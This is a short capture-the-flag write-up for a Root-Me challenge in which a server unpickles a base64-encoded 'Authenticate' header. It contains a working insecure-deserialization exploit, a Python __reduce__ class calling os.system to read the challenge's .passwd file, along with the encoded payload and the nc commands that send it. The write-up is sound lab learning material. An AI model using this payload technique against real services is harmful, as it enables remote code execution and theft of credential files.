Let's try to connect.

```
nc challenge02.root-me.org 60005
AUTH admin HTTP/1.0
```

We got the following error message: {"result": "Can't find 'Authenticate' header"}

It wants a "Authenticate Header".

```
nc challenge02.root-me.org 60005
AUTH admin HTTP/1.0
Authenticate: something
```

```
{"result": "Authentication failed = Traceback (most recent call last):\n  File \"/challenge/app-script/ch5/ch5\", line 52, in do_AUTH\n    authcombi = pickle.loads(base64.b64decode(self.headers.getheader('Authenticate')))\n  File \"/usr/lib/python2.7/base64.py\", line 76, in b64decode\n    raise TypeError(msg)\nTypeError: Incorrect padding\n"}
```

So, the program is decoding base64 encoded header "authenticate", and then loads it with pickle. The idea will now be to create an python object, encode it with pickle, and in base64, so that when it gets loaded by the program, it returns the required flag.

We create the following object: (solution of vader)

```
#!/usr/bin/env python

import os
import cPickle
import base64

class RunCmd(object):
    def __reduce__(self):
        return(os.system,
                (('cat /challenge/app-script/ch5/.passwd >&4'),))

print(base64.b64encode(cPickle.dumps(RunCmd())))
```
The payload is now: Y3Bvc2l4CnN5c3RlbQpwMQooUydjYXQgL2NoYWxsZW5nZS9hcHAtc2NyaXB0L2NoNS8ucGFzc3dkID4mNCcKcDIKdHAzClJwNAou

```
nc challenge02.root-me.org 60005
AUTH admin HTTP/1.0
Authenticate: Y3Bvc2l4CnN5c3RlbQpwMQooUydjYXQgL2NoYWxsZW5nZS9hcHAtc2NyaXB0L2NoNS8ucGFzc3dkID4mNCcKcDIKdHAzClJwNAou
```

Then, pickle loads the object, and execute the command, and display the password.
